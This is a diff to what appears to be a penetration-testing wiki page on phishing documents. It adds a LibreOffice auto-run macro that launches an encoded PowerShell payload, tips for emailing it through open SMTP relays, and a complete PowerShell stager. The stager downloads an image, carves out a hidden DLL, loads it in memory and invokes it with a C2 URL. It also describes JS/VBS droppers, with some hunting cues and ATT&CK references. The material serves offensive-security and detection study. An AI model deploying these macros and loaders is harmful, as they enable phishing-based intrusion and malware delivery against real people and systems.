@@ -83,6 +83,23 @@ Do this because you **can't save macro's inside a `.docx`** and there's a **stig
   - [**macphish**](https://github.com/cldrn/macphish)
   - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
+## LibreOffice ODT auto-run macros (Basic)
+
+LibreOffice Writer documents can embed Basic macros and auto-execute them when the file is opened by binding the macro to the **Open Document** event (Tools → Customize → Events → Open Document → Macro…). A simple reverse shell macro looks like:
+
+```vb
+Sub Shell
+    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
+End Sub
+```
+
+Note the doubled quotes (`""`) inside the string – LibreOffice Basic uses them to escape literal quotes, so payloads that end with `...==""")` keep both the inner command and the Shell argument balanced.
+
+Delivery tips:
+
+- Save as `.odt` and bind the macro to the document event so it fires immediately when opened.
+- When emailing with `swaks`, use `--attach @resume.odt` (the `@` is required so the file bytes, not the filename string, are sent as the attachment). This is critical when abusing SMTP servers that accept arbitrary `RCPT TO` recipients without validation.
+
 ## HTA Files
 
 An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.
@@ -215,9 +232,90 @@ Hunting/IOCs
 - AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
 - Long-running business threads ending with links hosted under trusted PaaS domains.
 
+## Steganography-delimited payloads in images (PowerShell stager)
+
+Recent loader chains deliver an obfuscated JavaScript/VBS that decodes and runs a Base64 PowerShell stager. That stager downloads an image (often GIF) that contains a Base64-encoded .NET DLL hidden as plain text between unique start/end markers. The script searches for these delimiters (examples seen in the wild: «<<sudo_png>> … <<sudo_odt>>>»), extracts the between-text, Base64-decodes it to bytes, loads the assembly in-memory and invokes a known entry method with the C2 URL.
+
+Workflow
+- Stage 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell stager with -nop -w hidden -ep bypass.
+- Stage 2: PowerShell stager → downloads image, carves marker-delimited Base64, loads the .NET DLL in-memory and calls its method (e.g., VAI) passing the C2 URL and options.
+- Stage 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe). See more about process hollowing and trusted utility proxy execution here:
+
+{{#ref}}
+../../reversing/common-api-used-in-malware.md
+{{#endref}}
+
+PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:
+
+<details>
+<summary>PowerShell stego payload extractor and loader</summary>
+
+```powershell
+# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
+param(
+  [string]$Url    = 'https://example.com/payload.gif',
+  [string]$StartM = '<<sudo_png>>',
+  [string]$EndM   = '<<sudo_odt>>',
+  [string]$EntryType = 'Loader',
+  [string]$EntryMeth = 'VAI',
+  [string]$C2    = 'https://c2.example/payload'
+)
+$img = (New-Object Net.WebClient).DownloadString($Url)
+$start = $img.IndexOf($StartM)
+$end   = $img.IndexOf($EndM)
+if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
+$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
+$bytes = [Convert]::FromBase64String($b64)
+$asm = [Reflection.Assembly]::Load($bytes)
+$type = $asm.GetType($EntryType)
+$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
+$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
+```
+
+</details>
+
+Notes
+- This is ATT&CK T1027.003 (steganography/marker-hiding). Markers vary between campaigns.
+- AMSI/ETW bypass and string deobfuscation are commonly applied before loading the assembly.
+- Hunting: scan downloaded images for known delimiters; identify PowerShell accessing images and immediately decoding Base64 blobs.
+
+See also stego tools and carving techniques:
+
+{{#ref}}
+../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
+{{#endref}}
+
+## JS/VBS droppers → Base64 PowerShell staging
+
+A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.
+
+Skeleton logic (abstract):
+- Read own file contents
+- Locate a Base64 blob between junk strings
+- Decode to ASCII PowerShell
+- Execute with `wscript.exe`/`cscript.exe` invoking `powershell.exe`
+
+Hunting cues
+- Archived JS/VBS attachments spawning `powershell.exe` with `-enc`/`FromBase64String` in the command line.
+- `wscript.exe` launching `powershell.exe -nop -w hidden` from user temp paths.
+
+## Windows files to steal NTLM hashes
+
+Check the page about **places to steal NTLM creds**:
+
+{{#ref}}
+../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
+{{#endref}}
+
+
 ## References
 
+- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
 - [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
 - [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
+- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
+- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
+- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
 
 {{#include ../../banners/hacktricks-training.md}}
